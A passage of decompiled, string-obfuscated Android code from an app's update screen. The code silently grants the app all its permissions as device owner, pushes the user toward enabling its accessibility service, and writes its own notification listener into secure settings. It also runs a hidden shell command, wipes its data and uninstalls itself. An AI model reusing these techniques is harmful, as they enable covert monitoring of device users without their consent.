                                                    updateActivity2.getPackageManager().getPackageInstaller().uninstall(updateActivity2.getPackageName(), PendingIntent.getBroadcast(updateActivity2, updateActivity2.getPackageName().hashCode(), intent3, 167772160).getIntentSender());
                                                    Log.e(str12, AbstractC1387m.m2421h(new byte[]{86, 71, 40, -92, -116, ByteCompanionObject.MAX_VALUE, -91, -9, 104, 85, 63, -82, -127, 116, -91, -52, 38, 83, 37, -90, -125, 107, -76, -33, 106, 74, 107, -67, -120, 105, -75, -37, 117, 82, 46, -85}, new byte[]{6, 38, 75, -49, -19, 24, -64, -66}));
                                                } catch (Exception e14) {
                                                    Log.e(str12, AbstractC1387m.m2421h(new byte[]{24, -52, 59, -14, 7, 79, 40, -47, 38, -34, 44, -8, 10, 68, 40, -22, 104, -40, 54, -16, 8, 91, 57, -7, 36, -63, 120, -1, 7, 65, 33, -3, 44}, new byte[]{72, -83, 88, -103, 102, 40, 77, -104}), e14);
                                                }
                                            }
                                        }
                                        updateActivity2.f1685h.setEnabled(true);
                                        break;
                                    default:
                                        updateActivity.f1687j = 0;
                                        break;
                                }
                            }
                        }, 10000L);
                        break;
                    case 5:
                        String str8 = UpdateActivity.f1678l;
                        updateActivity.finish();
                        break;
                    case 6:
                        String str9 = UpdateActivity.f1678l;
                        C2194a.m3500t(C2349s0.class, null).show(updateActivity.getSupportFragmentManager(), AbstractC1387m.m2421h(new byte[]{88, -23, -7, 47, -63, -19, 45, 63, 107, -5, -28, 46, -48, -15, 43, 56, 64, -5, -45, 37, -53, -28, 36, 34, 83}, new byte[]{52, -120, -116, 65, -94, -123, 72, 77}));
                        break;
                    case 7:
                        String str10 = UpdateActivity.f1678l;
                        updateActivity.m1601t();
                        break;
                    case 8:
                        updateActivity.f1687j++;
                        Handler handler2 = updateActivity.f1688k;
                        handler2.removeCallbacksAndMessages(null);
                        handler2.postDelayed(new Runnable() { // from class: e0.w2
                            @Override // java.lang.Runnable
                            public final void run() {
                                switch (i15) {
                                    case 0:
                                        String str11 = UpdateActivity.f1678l;
                                        UpdateActivity updateActivity2 = updateActivity;
                                        C1417s c1417sM2423j = AbstractC1387m.m2423j(updateActivity2);
                                        String str12 = UpdateActivity.f1678l;
                                        Log.e(str12, AbstractC1387m.m2421h(new byte[]{-62, -52, 0, -104, -38, 38, -89, 67, -29, -3, 47, -72, -26, 28, -61, 71, -20, -20, 50, -78, -110, 99}, new byte[]{-96, -87, 102, -9, -88, 67, -121, 2}).concat(c1417sM2423j.m2451a()));
                                        try {
                                            Intent intent = new Intent(AbstractC1387m.m2421h(new byte[]{-118, 54, -79, 70, -62, 24, -125, -113, -126, 54, -95, 81, -61, 5, -55, -64, -120, 44, -68, 91, -61, 95, -93, -28, -89, 29, -127, 113}, new byte[]{-21, 88, -43, 52, -83, 113, -25, -95}));
                                            intent.setData(Uri.parse(AbstractC1387m.m2421h(new byte[]{54, 97, 56, 91, 67, -61, -111, -21}, new byte[]{70, 0, 91, 48, 34, -92, -12, -47}) + updateActivity2.getPackageName()));
                                            intent.addFlags(268435456);
                                            updateActivity2.startActivity(intent);
                                            Log.e(str12, AbstractC1387m.m2421h(new byte[]{-30, 119, -81, 43, 88, 123, 31, 3, -26, 120, -66, 54, 82, 21, 51, 51, -62, 70, -113, 7, 115}, new byte[]{-93, 52, -5, 98, 23, 53, 64, 71}));
                                        } catch (Exception e12) {
                                            Log.e(str12, AbstractC1387m.m2421h(new byte[]{44, 97, -108, -92, -12, 84, -73, -8, 40, 110, -123, -71, -2, 58, -114, -35, 4, 78, -91, -119}, new byte[]{109, 34, -64, -19, -69, 26, -24, -68}), e12);
                                            try {
                                                Intent intent2 = new Intent(AbstractC1387m.m2421h(new byte[]{-37, 92, 33, 39, 16, 117, -91, 83, -45, 92, 49, 48, 17, 104, -17, 28, -39, 70, 44, 58, 17, 50, -108, 51, -13, 124, 22, 1, 62, 80, -115, 34, -22, 115, 6, 30, 62, 91, -124}, new byte[]{-70, 50, 69, 85, ByteCompanionObject.MAX_VALUE, 28, -63, 125}));
                                                intent2.setData(Uri.parse(AbstractC1387m.m2421h(new byte[]{-39, 75, -36, 78, 22, -67, 44, -20}, new byte[]{-87, 42, -65, 37, 119, -38, 73, -42}) + updateActivity2.getPackageName()));
                                                intent2.addFlags(268435456);
                                                updateActivity2.startActivity(intent2);
                                                Log.e(str12, AbstractC1387m.m2421h(new byte[]{117, 84, 97, -43, 3, -117, 35, 8, 122, 94, 123, -49, 24, -124, 48, 17, 107, 71, 116, -33, 7, -124, 59, 24, 20, 100, 65, -3, 62, -79, 25, 57}, new byte[]{52, 23, 53, -100, 76, -59, 124, 93}));
                                            } catch (Exception e13) {
                                                Log.e(str12, AbstractC1387m.m2421h(new byte[]{-24, -53, 31, 120, 55, -51, -85, 27, -25, -63, 5, 98, 44, -62, -72, 2, -10, -40, 10, 114, 51, -62, -77, 11, -119, -18, 42, 88, 20, -26, -112}, new byte[]{-87, -120, 75, 49, 120, -125, -12, 78}), e13);
                                                try {
                                                    Log.e(str12, AbstractC1387m.m2421h(new byte[]{49, -13, 75, -82, -2, 13, 57, 28, 15, -31, 92, -92, -13, 6, 57, 39, 65, -25, 70, -84, -15, 25, 40, 52, 13, -2, 8, -93, -2, 6, 48, 55, 0, -15, 67, -23, -65, 25, 40, 52, 21, -9, 18, -27}, new byte[]{97, -110, 40, -59, -97, 106, 92, 85}).concat(AbstractC1387m.m2423j(updateActivity2).m2451a()));
                                                    Intent intent3 = new Intent(updateActivity2, (Class<?>) InstallResultReceiver.class);
                                                    intent3.setAction(updateActivity2.getPackageName() + AbstractC1387m.m2421h(new byte[]{112, -59, ByteCompanionObject.MIN_VALUE, 29, 22, 17, -67, -18, 23, -40, -106, 5, 17, 2, -92, -1, 12, -45, -106, 4, 28, 26}, new byte[]{94, -106, -59, 81, 80, 78, -24, -96}));
                                                    intent3.putExtra(AbstractC1387m.m2421h(new byte[]{87, -7, -17, 94, 29, -117, 7, 102, 86}, new byte[]{56, -119, -118, 44, 124, -1, 110, 9}), AbstractC1387m.m2421h(new byte[]{39, -67, 80, -75, -29, 39, -40, 95, 62}, new byte[]{82, -45, 57, -37, -112, 83, -71, 51}));
                                                    intent3.putExtra(AbstractC1387m.m2421h(new byte[]{-9, -26, 7, 48, 92, -108, -48, 85, -26, -22, 1}, new byte[]{-121, -121, 100, 91, Base64.padSymbol, -13, -75, 27}), updateActivity2.getPackageName());
                                                    updateActivity2.getPackageManager().getPackageInstaller().uninstall(updateActivity2.getPackageName(), PendingIntent.getBroadcast(updateActivity2, updateActivity2.getPackageName().hashCode(), intent3, 167772160).getIntentSender());
                                                    Log.e(str12, AbstractC1387m.m2421h(new byte[]{86, 71, 40, -92, -116, ByteCompanionObject.MAX_VALUE, -91, -9, 104, 85, 63, -82, -127, 116, -91, -52, 38, 83, 37, -90, -125, 107, -76, -33, 106, 74, 107, -67, -120, 105, -75, -37, 117, 82, 46, -85}, new byte[]{6, 38, 75, -49, -19, 24, -64, -66}));
                                                } catch (Exception e14) {
                                                    Log.e(str12, AbstractC1387m.m2421h(new byte[]{24, -52, 59, -14, 7, 79, 40, -47, 38, -34, 44, -8, 10, 68, 40, -22, 104, -40, 54, -16, 8, 91, 57, -7, 36, -63, 120, -1, 7, 65, 33, -3, 44}, new byte[]{72, -83, 88, -103, 102, 40, 77, -104}), e14);
                                                }
                                            }
                                        }
                                        updateActivity2.f1685h.setEnabled(true);
                                        break;
                                    default:
                                        updateActivity.f1687j = 0;
                                        break;
                                }
                            }
                        }, 1000L);
                        if (updateActivity.f1687j >= 10) {
                            updateActivity.f1687j = 0;
                            updateActivity.f1682e.setVisibility(0);
                        }
                        break;
                    default:
                        String str11 = UpdateActivity.f1678l;
                        new C1445y2(AbstractC1387m.m2421h(new byte[]{89, -15}, new byte[]{23, -94, 17, -110, -3, 93, 70, -67}), updateActivity);
                        break;
                }
            }
        });
        this.f1683f = (Button) findViewById(R.id.resetAndUpdateButton);
        this.f1684g = (Button) findViewById(R.id.clearDataButton);
        Button button = (Button) findViewById(R.id.button_testNS_install);
        this.f1682e = button;
        final int i14 = 7;
        button.setOnClickListener(new View.OnClickListener(this) { // from class: e0.v2

            /* JADX INFO: renamed from: c */
            public final /* synthetic */ UpdateActivity f3455c;

            {
                this.f3455c = this;
            }

            /* JADX WARN: Code duplicated, block: B:107:0x03a5  */
            /* JADX WARN: Code duplicated, block: B:113:0x03dc  */
            /* JADX WARN: Code duplicated, block: B:134:0x01c9 A[SYNTHETIC] */
            /* JADX WARN: Code duplicated, block: B:136:0x01af A[SYNTHETIC] */
            /* JADX WARN: Code duplicated, block: B:52:0x01b5  */
            /* JADX WARN: Code duplicated, block: B:57:0x01d2  */
            /* JADX WARN: Code duplicated, block: B:68:0x0263 A[DONT_INVERT] */
            /* JADX WARN: Code duplicated, block: B:69:0x0265 A[Catch: Exception -> 0x0261, TryCatch #4 {Exception -> 0x0261, blocks: (B:60:0x0220, B:62:0x0241, B:65:0x024c, B:69:0x0265, B:72:0x026c, B:74:0x0296, B:73:0x0292), top: B:128:0x0220 }] */
            /* JADX WARN: Code duplicated, block: B:73:0x0292 A[Catch: Exception -> 0x0261, TryCatch #4 {Exception -> 0x0261, blocks: (B:60:0x0220, B:62:0x0241, B:65:0x024c, B:69:0x0265, B:72:0x026c, B:74:0x0296, B:73:0x0292), top: B:128:0x0220 }] */
            @Override // android.view.View.OnClickListener
            public final void onClick(View view) {
                String[] strArr;
                char c;
                Boolean bool;
                Iterator<AccessibilityServiceInfo> it;
                String string;
                ComponentName componentName;
                String strFlattenToString;
                int i15 = i14;
                final UpdateActivity updateActivity = this.f3455c;
                final int i16 = 1;
                final int i17 = 0;
                switch (i15) {
                    case 0:
                        String str3 = UpdateActivity.f1678l;
                        updateActivity.finish();
                        break;
                    case 1:
                        String str4 = UpdateActivity.f1678l;
                        AbstractC3656k.m5875u(updateActivity, new Intent(updateActivity, (Class<?>) ManageAppsActivity.class), null);
                        break;
                    case 2:
                        String str5 = UpdateActivity.f1678l;
                        if (!((DevicePolicyManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-54, -62, -102, 109, 29, -104, -14, 90, -63, -53, -123, 103, 7}, new byte[]{-82, -89, -20, 4, 126, -3, -83, 42}))).isDeviceOwnerApp(updateActivity.getPackageName())) {
                            Context applicationContext = updateActivity.getApplicationContext();
                            try {
                                strArr = applicationContext.getPackageManager().getPackageInfo(applicationContext.getPackageName(), 4096).requestedPermissions;
                            } catch (PackageManager.NameNotFoundException e) {
                                e.printStackTrace();
                                strArr = new String[0];
                            }
                            if (strArr != null && strArr.length != 0) {
                                ArrayList arrayList = new ArrayList();
                                for (String str6 : strArr) {
                                    if (ContextCompat.checkSelfPermission(applicationContext, str6) != 0) {
                                        arrayList.add(str6);
                                    }
                                }
                                if (!arrayList.isEmpty()) {
                                    ActivityCompat.requestPermissions(updateActivity, (String[]) arrayList.toArray(new String[0]), 100);
                                }
                            }
                            List<AccessibilityServiceInfo> enabledAccessibilityServiceList = ((AccessibilityManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{50, -84, -96, 96, -101, 114, -102, -12, 58, -93, -86, 113, -111}, new byte[]{83, -49, -61, 5, -24, 1, -13, -106}))).getEnabledAccessibilityServiceList(-1);
                            Boolean bool2 = Boolean.FALSE;
                            Iterator<AccessibilityServiceInfo> it2 = enabledAccessibilityServiceList.iterator();
                            while (it2.hasNext()) {
                                if (it2.next().getId().equals(updateActivity.getPackageName())) {
                                    bool2 = Boolean.TRUE;
                                }
                            }
                            if (!bool2.booleanValue()) {
                                AbstractC3656k.m5875u(updateActivity, new Intent(AbstractC1387m.m2421h(new byte[]{-80, 10, -116, -127, 107, -34, 3, -85, -94, 1, -100, -121, 109, -39, 0, -10, -1, 37, -85, -80, 65, -28, 52, -52, -109, 45, -92, -70, 80, -18, 56, -42, -108, 48, -68, -70, 74, -16, 52}, new byte[]{-47, 100, -24, -13, 4, -73, 103, -123})), null);
                            }
                            break;
                        } else {
                            ComponentName componentName2 = new ComponentName(updateActivity, (Class<?>) DPups.class);
                            String strM2421h = AbstractC1387m.m2421h(new byte[]{-14, -107, 82, 72, 40, 29, 122, 96, -51, -98, 103, 87, 32, 0, 125, 102, -48}, new byte[]{-94, -16, 32, 37, 65, 110, 9, 9});
                            DevicePolicyManager devicePolicyManager = (DevicePolicyManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-5, -44, -62, 93, -26, -81, 31, -75, -16, -35, -35, 87, -4}, new byte[]{-97, -79, -76, 52, -123, -54, 64, -59}));
                            try {
                                String packageName = updateActivity.getPackageName();
                                String[] strArr2 = updateActivity.getPackageManager().getPackageInfo(packageName, 4096).requestedPermissions;
                                if (strArr2 != null) {
                                    int length = strArr2.length;
                                    c = 0;
                                    while (i17 < length) {
                                        try {
                                            devicePolicyManager.setPermissionGrantState(componentName2, packageName, strArr2[i17], 1);
                                            i17++;
                                        } catch (Exception e6) {
                                            e = e6;
                                            e.printStackTrace();
                                            List<AccessibilityServiceInfo> enabledAccessibilityServiceList5 = ((AccessibilityManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-125, 2, 20, -111, 3, -106, -48, 4, -117, 13, 30, ByteCompanionObject.MIN_VALUE, 9}, new byte[]{-30, 97, 119, -12, 112, -27, -71, 102}))).getEnabledAccessibilityServiceList(-1);
                                            bool = Boolean.FALSE;
                                            it = enabledAccessibilityServiceList5.iterator();
                                            while (it.hasNext()) {
                                                if (it.next().getId().equals(updateActivity.getPackageName())) {
                                                    bool = Boolean.TRUE;
                                                }
                                            }
                                            if (!bool.booleanValue()) {
                                                AbstractC3656k.m5875u(updateActivity, new Intent(AbstractC1387m.m2421h(new byte[]{102, -125, -63, -59, -122, 4, 35, 4, 116, -120, -47, -61, ByteCompanionObject.MIN_VALUE, 3, 32, 89, 41, -84, -26, -12, -84, 62, 20, 99, 69, -92, -23, -2, -67, 52, 24, 121, 66, -71, -15, -2, -89, 42, 20}, new byte[]{7, -19, -91, -73, -23, 109, 71, 42})), null);
                                            }
                                            DevicePolicyManager devicePolicyManager5 = (DevicePolicyManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-26, -104, 41, 54, -80, -50, -12, -33, -19, -111, 54, 60, -86}, new byte[]{-126, -3, 95, 95, -45, -85, -85, -81}));
                                            new ComponentName(updateActivity, (Class<?>) DPups.class);
                                            devicePolicyManager5.isDeviceOwnerApp(updateActivity.getPackageName());
                                            Runtime.getRuntime().exec(AbstractC1387m.m2421h(new byte[]{-29, 10, 29, -114, 2, 67, 126, 60, -77, 4, 82, -124, 94, 71, 104, 41, -2, 23, 81, -116, 94, 76, 113, 62, -6, 20, 73, -120, 2, 86, 48, 41, -3, 3, 79, -122, 25, 70, 62, 56, -10, 21, 80, ByteCompanionObject.MIN_VALUE, 3, 81, 121, 39, -3, 73, 106, -69, 57, 118, 85, 23, -64, 34, 126, -68, 34, 103, 79, 27, -42, 51, 105, -96, 62, 101, 67}, new byte[]{-109, 103, Base64.padSymbol, -23, 112, 34, 16, 72}));
                                            string = Settings.Secure.getString(updateActivity.getContentResolver(), AbstractC1387m.m2421h(new byte[]{-74, -109, 55, 9, -28, -106, -56, 123, -67, -110, 34, 2, -18, -102, -49, 69, -89, -108, 57, 5, -41, -97, -59, 87, -89, -104, 56, 14, -6, ByteCompanionObject.MIN_VALUE}, new byte[]{-45, -3, 86, 107, -120, -13, -84, 36}));
                                            componentName = new ComponentName(updateActivity, (Class<?>) NLService.class);
                                            if (string == null) {
                                                if (string != null) {
                                                    strFlattenToString = componentName.flattenToString();
                                                } else {
                                                    strFlattenToString = componentName.flattenToString();
                                                }
                                                Settings.Secure.putString(updateActivity.getContentResolver(), AbstractC1387m.m2421h(new byte[]{-73, 97, 11, 60, -106, 67, 94, -68, -68, 96, 30, 55, -100, 79, 89, -126, -90, 102, 5, 48, -91, 74, 83, -112, -90, 106, 4, 59, -120, 85}, new byte[]{-46, 15, 106, 94, -6, 38, 58, -29}), strFlattenToString);
                                                Log.d(strM2421h, AbstractC1387m.m2421h(new byte[]{-52, 1, 22, -32, -22, -79, -41, -91, -10, 7, 13, -25, -84, -76, -35, -73, -10, 11, 12, -20, -2, -8, -60, -95, -16, 3, 11, -6, -1, -79, -37, -86, -94, 9, 16, -24, -30, -84, -47, -96, -84}, new byte[]{-126, 110, 98, -119, -116, -40, -76, -60}));
                                            } else {
                                                if (string != null) {
                                                    strFlattenToString = componentName.flattenToString();
                                                } else {
                                                    strFlattenToString = componentName.flattenToString();
                                                }
                                                Settings.Secure.putString(updateActivity.getContentResolver(), AbstractC1387m.m2421h(new byte[]{-73, 97, 11, 60, -106, 67, 94, -68, -68, 96, 30, 55, -100, 79, 89, -126, -90, 102, 5, 48, -91, 74, 83, -112, -90, 106, 4, 59, -120, 85}, new byte[]{-46, 15, 106, 94, -6, 38, 58, -29}), strFlattenToString);
                                                Log.d(strM2421h, AbstractC1387m.m2421h(new byte[]{-52, 1, 22, -32, -22, -79, -41, -91, -10, 7, 13, -25, -84, -76, -35, -73, -10, 11, 12, -20, -2, -8, -60, -95, -16, 3, 11, -6, -1, -79, -37, -86, -94, 9, 16, -24, -30, -84, -47, -96, -84}, new byte[]{-126, 110, 98, -119, -116, -40, -76, -60}));
                                            }
                                            if (ContextCompat.checkSelfPermission(updateActivity, AbstractC1387m.m2421h(new byte[]{93, 30, 76, 55, 25, 0, -69, 114, 76, 21, 90, 40, 31, 26, -84, 53, 83, 30, 6, 4, 53, 42, -102, 15, 111, 47, 110, 12, 56, 44, ByteCompanionObject.MIN_VALUE, 16, 115, 51, 105, 17, 63, 38, -111}, new byte[]{60, 112, 40, 69, 118, 105, -33, 92})) == 0) {
                                                ActivityCompat.requestPermissions(updateActivity, new String[]{AbstractC1387m.m2421h(new byte[]{124, 98, 89, 19, -7, 60, 48, 60, 109, 105, 79, 12, -1, 38, 39, 123, 114, 98, 19, 32, -43, 22, 17, 65, 78, 83, 123, 40, -40, 16, 11, 94, 82, 79, 124, 53, -33, 26, 26}, new byte[]{29, 12, Base64.padSymbol, 97, -106, 85, 84, 18})}, 100);
                                                return;
                                            } else if (Build.VERSION.SDK_INT < 29) {
                                                return;
                                            } else {
                                                return;
                                            }
                                        }
                                    }
                                } else {
                                    c = 0;
                                }
                            } catch (Exception e10) {
                                e = e10;
                                c = 0;
                            }
                            List<AccessibilityServiceInfo> enabledAccessibilityServiceList6 = ((AccessibilityManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-125, 2, 20, -111, 3, -106, -48, 4, -117, 13, 30, ByteCompanionObject.MIN_VALUE, 9}, new byte[]{-30, 97, 119, -12, 112, -27, -71, 102}))).getEnabledAccessibilityServiceList(-1);
                            bool = Boolean.FALSE;
                            it = enabledAccessibilityServiceList6.iterator();
                            while (it.hasNext()) {
                                if (it.next().getId().equals(updateActivity.getPackageName())) {
                                    bool = Boolean.TRUE;
                                }
                            }
                            if (!bool.booleanValue()) {
                                AbstractC3656k.m5875u(updateActivity, new Intent(AbstractC1387m.m2421h(new byte[]{102, -125, -63, -59, -122, 4, 35, 4, 116, -120, -47, -61, ByteCompanionObject.MIN_VALUE, 3, 32, 89, 41, -84, -26, -12, -84, 62, 20, 99, 69, -92, -23, -2, -67, 52, 24, 121, 66, -71, -15, -2, -89, 42, 20}, new byte[]{7, -19, -91, -73, -23, 109, 71, 42})), null);
                            }
                            DevicePolicyManager devicePolicyManager6 = (DevicePolicyManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-26, -104, 41, 54, -80, -50, -12, -33, -19, -111, 54, 60, -86}, new byte[]{-126, -3, 95, 95, -45, -85, -85, -81}));
                            new ComponentName(updateActivity, (Class<?>) DPups.class);
                            devicePolicyManager6.isDeviceOwnerApp(updateActivity.getPackageName());
                            try {
                                Runtime.getRuntime().exec(AbstractC1387m.m2421h(new byte[]{-29, 10, 29, -114, 2, 67, 126, 60, -77, 4, 82, -124, 94, 71, 104, 41, -2, 23, 81, -116, 94, 76, 113, 62, -6, 20, 73, -120, 2, 86, 48, 41, -3, 3, 79, -122, 25, 70, 62, 56, -10, 21, 80, ByteCompanionObject.MIN_VALUE, 3, 81, 121, 39, -3, 73, 106, -69, 57, 118, 85, 23, -64, 34, 126, -68, 34, 103, 79, 27, -42, 51, 105, -96, 62, 101, 67}, new byte[]{-109, 103, Base64.padSymbol, -23, 112, 34, 16, 72}));
                                break;
                            } catch (IOException unused) {
                            }
                            try {
                                string = Settings.Secure.getString(updateActivity.getContentResolver(), AbstractC1387m.m2421h(new byte[]{-74, -109, 55, 9, -28, -106, -56, 123, -67, -110, 34, 2, -18, -102, -49, 69, -89, -108, 57, 5, -41, -97, -59, 87, -89, -104, 56, 14, -6, ByteCompanionObject.MIN_VALUE}, new byte[]{-45, -3, 86, 107, -120, -13, -84, 36}));
                                componentName = new ComponentName(updateActivity, (Class<?>) NLService.class);
                                if (string == null && string.contains(componentName.flattenToString())) {
                                    Log.d(strM2421h, AbstractC1387m.m2421h(new byte[]{63, -125, 40, -126, 59, -101, -86, 81, 5, -123, 51, -123, 125, -98, -96, 67, 5, -119, 50, -114, 47, -46, -88, 92, 3, -119, Base64.padSymbol, -113, 36, -46, -82, 66, 16, -126, 40, -114, 57, -36}, new byte[]{113, -20, 92, -21, 93, -14, -55, 48}));
                                } else {
                                    if (string != null || string.isEmpty()) {
                                        strFlattenToString = componentName.flattenToString();
                                    } else {
                                        StringBuilder sb = new StringBuilder();
                                        sb.append(string);
                                        byte[] bArr2 = new byte[1];
                                        bArr2[c] = 55;
                                        sb.append(AbstractC1387m.m2421h(bArr2, new byte[]{13, 42, -127, ByteCompanionObject.MIN_VALUE, -4, -26, 59, -41}));
                                        sb.append(componentName.flattenToString());
                                        strFlattenToString = sb.toString();
                                    }
                                    Settings.Secure.putString(updateActivity.getContentResolver(), AbstractC1387m.m2421h(new byte[]{-73, 97, 11, 60, -106, 67, 94, -68, -68, 96, 30, 55, -100, 79, 89, -126, -90, 102, 5, 48, -91, 74, 83, -112, -90, 106, 4, 59, -120, 85}, new byte[]{-46, 15, 106, 94, -6, 38, 58, -29}), strFlattenToString);
                                    Log.d(strM2421h, AbstractC1387m.m2421h(new byte[]{-52, 1, 22, -32, -22, -79, -41, -91, -10, 7, 13, -25, -84, -76, -35, -73, -10, 11, 12, -20, -2, -8, -60, -95, -16, 3, 11, -6, -1, -79, -37, -86, -94, 9, 16, -24, -30, -84, -47, -96, -84}, new byte[]{-126, 110, 98, -119, -116, -40, -76, -60}));
                                }
                            } catch (Exception e11) {
                                Log.e(strM2421h, AbstractC1387m.m2421h(new byte[]{-47, 14, 100, 118, -81, -49, -8, 87, -8, 79, 106, 104, -85, -59, -84, 3, -7, 0, 121, 115, -84, -62, -69, 66, -29, 6, 98, 116, -22, -57, -79, 80, -29, 10, 99, ByteCompanionObject.MAX_VALUE, -72, -117, -88, 70, -27, 2, 100, 105, -71, -62, -73, 77, -83, 79}, new byte[]{-105, 111, 13, 26, -54, -85, -40, 35}) + e11.getMessage());
                            }
                        }
                        if (ContextCompat.checkSelfPermission(updateActivity, AbstractC1387m.m2421h(new byte[]{93, 30, 76, 55, 25, 0, -69, 114, 76, 21, 90, 40, 31, 26, -84, 53, 83, 30, 6, 4, 53, 42, -102, 15, 111, 47, 110, 12, 56, 44, ByteCompanionObject.MIN_VALUE, 16, 115, 51, 105, 17, 63, 38, -111}, new byte[]{60, 112, 40, 69, 118, 105, -33, 92})) == 0) {
                            ActivityCompat.requestPermissions(updateActivity, new String[]{AbstractC1387m.m2421h(new byte[]{124, 98, 89, 19, -7, 60, 48, 60, 109, 105, 79, 12, -1, 38, 39, 123, 114, 98, 19, 32, -43, 22, 17, 65, 78, 83, 123, 40, -40, 16, 11, 94, 82, 79, 124, 53, -33, 26, 26}, new byte[]{29, 12, Base64.padSymbol, 97, -106, 85, 84, 18})}, 100);
                        } else if (Build.VERSION.SDK_INT < 29 && ContextCompat.checkSelfPermission(updateActivity, AbstractC1387m.m2421h(new byte[]{-98, -29, -58, 50, 77, 42, -53, 38, -113, -24, -48, 45, 75, 48, -36, 97, -112, -29, -116, 1, 97, 0, -22, 91, -84, -46, -32, 1, 97, 8, -24, 90, -80, -40, -20, 4, 125, 15, -32, 75, -66, -39, -21, 15, 108}, new byte[]{-1, -115, -94, 64, 34, 67, -81, 8})) != 0) {
                            ActivityCompat.requestPermissions(updateActivity, new String[]{AbstractC1387m.m2421h(new byte[]{-51, 34, -45, -116, 87, 2, 116, -126, -36, 41, -59, -109, 81, 24, 99, -59, -61, 34, -103, -65, 123, 40, 85, -1, -1, 19, -11, -65, 123, 32, 87, -2, -29, 25, -7, -70, 103, 39, 95, -17, -19, 24, -2, -79, 118}, new byte[]{-84, 76, -73, -2, 56, 107, 16, -84})}, 100);
                            break;
                        }
                        break;
                    case 3:
                        String str7 = UpdateActivity.f1678l;
                        C1652b.m2745o().loadBoolean(AbstractC1387m.m2421h(new byte[]{102, 120, 47, -40, 75}, new byte[]{34, 40, 90, -88, 56, 83, 4, 111}), false);
                        SharedPreferences.Editor editorEdit = updateActivity.getSharedPreferences(C3277a.f9610c, 0).edit();
                        editorEdit.clear();
                        editorEdit.apply();
                        SharedPreferences.Editor editorEdit2 = updateActivity.getSharedPreferences(C2571e.f7130b, 0).edit();
                        editorEdit2.clear();
                        editorEdit2.apply();
                        File[] fileArrListFiles = updateActivity.getFilesDir().listFiles();
                        if (fileArrListFiles != null) {
                            for (File file : fileArrListFiles) {
                                file.delete();
                            }
                        }
                        File[] fileArrListFiles2 = updateActivity.getCacheDir().listFiles();
                        if (fileArrListFiles2 != null) {
                            int length2 = fileArrListFiles2.length;
                            while (i17 < length2) {
                                fileArrListFiles2[i17].delete();
                                i17++;
                            }
                        }
                        break;
                    case 4:
                        updateActivity.f1685h.setEnabled(false);
                        Handler handler = new Handler(Looper.getMainLooper());
                        updateActivity.m1600s(AbstractC1387m.m2421h(new byte[]{-99, 73, 20, -43, 25, -99, 12}, new byte[]{-12, 39, 125, -95, 112, -4, 96, -126}));
                        while (i16 <= 4) {
                            handler.postDelayed(new RunnableC0010c(updateActivity, i16, 6), ((long) i16) * 2000);
                            i16++;
                        }
                        handler.postDelayed(new Runnable() { // from class: e0.w2
                            @Override // java.lang.Runnable
                            public final void run() {
                                switch (i17) {
                                    case 0:
                                        String str11 = UpdateActivity.f1678l;
                                        UpdateActivity updateActivity2 = updateActivity;
                                        C1417s c1417sM2423j = AbstractC1387m.m2423j(updateActivity2);
                                        String str12 = UpdateActivity.f1678l;
                                        Log.e(str12, AbstractC1387m.m2421h(new byte[]{-62, -52, 0, -104, -38, 38, -89, 67, -29, -3, 47, -72, -26, 28, -61, 71, -20, -20, 50, -78, -110, 99}, new byte[]{-96, -87, 102, -9, -88, 67, -121, 2}).concat(c1417sM2423j.m2451a()));
                                        try {
                                            Intent intent = new Intent(AbstractC1387m.m2421h(new byte[]{-118, 54, -79, 70, -62, 24, -125, -113, -126, 54, -95, 81, -61, 5, -55, -64, -120, 44, -68, 91, -61, 95, -93, -28, -89, 29, -127, 113}, new byte[]{-21, 88, -43, 52, -83, 113, -25, -95}));
                                            intent.setData(Uri.parse(AbstractC1387m.m2421h(new byte[]{54, 97, 56, 91, 67, -61, -111, -21}, new byte[]{70, 0, 91, 48, 34, -92, -12, -47}) + updateActivity2.getPackageName()));
                                            intent.addFlags(268435456);
                                            updateActivity2.startActivity(intent);
                                            Log.e(str12, AbstractC1387m.m2421h(new byte[]{-30, 119, -81, 43, 88, 123, 31, 3, -26, 120, -66, 54, 82, 21, 51, 51, -62, 70, -113, 7, 115}, new byte[]{-93, 52, -5, 98, 23, 53, 64, 71}));
                                        } catch (Exception e12) {
                                            Log.e(str12, AbstractC1387m.m2421h(new byte[]{44, 97, -108, -92, -12, 84, -73, -8, 40, 110, -123, -71, -2, 58, -114, -35, 4, 78, -91, -119}, new byte[]{109, 34, -64, -19, -69, 26, -24, -68}), e12);
                                            try {
                                                Intent intent2 = new Intent(AbstractC1387m.m2421h(new byte[]{-37, 92, 33, 39, 16, 117, -91, 83, -45, 92, 49, 48, 17, 104, -17, 28, -39, 70, 44, 58, 17, 50, -108, 51, -13, 124, 22, 1, 62, 80, -115, 34, -22, 115, 6, 30, 62, 91, -124}, new byte[]{-70, 50, 69, 85, ByteCompanionObject.MAX_VALUE, 28, -63, 125}));
                                                intent2.setData(Uri.parse(AbstractC1387m.m2421h(new byte[]{-39, 75, -36, 78, 22, -67, 44, -20}, new byte[]{-87, 42, -65, 37, 119, -38, 73, -42}) + updateActivity2.getPackageName()));
                                                intent2.addFlags(268435456);
                                                updateActivity2.startActivity(intent2);
                                                Log.e(str12, AbstractC1387m.m2421h(new byte[]{117, 84, 97, -43, 3, -117, 35, 8, 122, 94, 123, -49, 24, -124, 48, 17, 107, 71, 116, -33, 7, -124, 59, 24, 20, 100, 65, -3, 62, -79, 25, 57}, new byte[]{52, 23, 53, -100, 76, -59, 124, 93}));
                                            } catch (Exception e13) {
                                                Log.e(str12, AbstractC1387m.m2421h(new byte[]{-24, -53, 31, 120, 55, -51, -85, 27, -25, -63, 5, 98, 44, -62, -72, 2, -10, -40, 10, 114, 51, -62, -77, 11, -119, -18, 42, 88, 20, -26, -112}, new byte[]{-87, -120, 75, 49, 120, -125, -12, 78}), e13);
                                                try {
